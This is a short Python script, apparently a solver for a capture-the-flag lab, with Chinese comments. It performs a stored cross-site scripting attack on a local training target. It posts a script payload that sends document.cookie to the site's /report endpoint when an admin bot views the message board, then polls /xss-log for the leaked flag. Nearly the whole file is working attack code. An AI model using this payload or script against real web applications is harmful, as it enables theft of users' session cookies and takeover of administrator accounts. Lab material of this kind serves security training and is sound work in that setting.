#!/usr/bin/env python3
# 07-xss-stored-cookie: 存储型 XSS 偷 admin cookie (Python 版，移植自 main.go)
import atexit
import os
import re
import sys
import time

import requests

atexit.register(lambda: print("作者 ZluxYao"))

BASE = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:33236")
BASE = BASE.rstrip("/")

# 存储型 XSS：admin bot 浏览 /board 时执行，把 document.cookie 发到 /report
PAYLOAD = "<script>fetch(`/report?c=${encodeURIComponent(document.cookie)}`)</script>"
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")

HEADERS = {"User-Agent": "TOGOGO-XSS-Py-Solver/1.0"}


def submit_payload(session: requests.Session) -> None:
    author = f"solver-{int(time.time())}"
    data = {"author": author, "content": PAYLOAD}
    # POST /board 会 302，不要跟随
    r = session.post(BASE + "/board", data=data, headers=HEADERS,
                     allow_redirects=False, timeout=10)
    if r.status_code not in (200, 302, 303):
        raise RuntimeError(f"unexpected status from /board: {r.status_code}")


def poll_flag(session: requests.Session, timeout: float = 90, interval: float = 5) -> str:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = session.get(BASE + "/xss-log", headers=HEADERS, timeout=10)
            m = FLAG_RE.search(r.text)
            if m:
                return m.group(0)
        except requests.RequestException as e:
            print(f"[!] read /xss-log failed: {e}")
        print(f"[*] Not found yet, sleep {interval}s ...")
        time.sleep(interval)
    raise TimeoutError(f"timeout after {timeout}s")


def main() -> None:
    print(f"[*] Target: {BASE}")
    session = requests.Session()

    print("[*] Submitting stored XSS payload to /board ...")
    submit_payload(session)
    print("[+] Payload submitted.")

    print("[*] Waiting for admin bot and polling /xss-log ...")
    flag = poll_flag(session)
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
